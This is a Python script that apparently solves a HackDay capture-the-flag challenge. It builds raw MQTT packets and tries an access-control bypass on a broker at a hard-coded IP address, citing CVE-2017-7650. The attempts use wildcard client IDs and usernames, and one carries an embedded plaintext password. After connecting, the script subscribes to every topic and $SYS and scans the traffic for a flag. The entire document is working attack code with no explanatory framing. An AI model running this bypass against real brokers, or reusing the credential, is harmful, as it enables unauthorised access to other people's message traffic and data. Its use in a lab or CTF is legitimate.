import socket
import struct
import time
import random

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username is not None: flags |= 0x80
    if password is not None: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username is not None: payload += struct.pack("!H", len(username)) + username.encode()
    if password is not None: payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    return b'\x10' + bytes([rem_len]) + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    return b'\x82' + bytes([rem_len]) + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    
    # Try ACL bypass CVE-2017-7650
    # Try username='#' or client_id='#'
    
    test_cases = [
        {"cid": "solver", "user": "#", "pwd": None},
        {"cid": "#", "user": "hackday", "pwd": "1Bc2Mk0rlevzuCG6AaDK6Opa"},
        {"cid": "solver", "user": "+", "pwd": None},
        {"cid": "+", "user": None, "pwd": None}
    ]
    
    for case in test_cases:
        print(f"[*] Trying: cid={case['cid']}, user={case['user']}")
        try:
            s = socket.create_connection((server, port), timeout=5)
            s.sendall(mqtt_connect(case['cid'], case['user'], case['pwd']))
            connack = s.recv(4)
            print(f"  Connack: {connack.hex()}")
            
            if len(connack) >= 4 and connack[3] == 0:
                s.sendall(mqtt_subscribe("#", 1))
                s.sendall(mqtt_subscribe("$SYS/#", 2))
                start = time.time()
                while time.time() - start < 3:
                    data = s.recv(4096)
                    if not data: break
                    decoded = data.decode(errors='ignore')
                    if "HACKDAY{" in decoded:
                        print(f"  [!!!] FLAG FOUND: {decoded}")
            s.close()
        except Exception as e:
            print(f"  Error: {e}")

if __name__ == "__main__":
    solve()
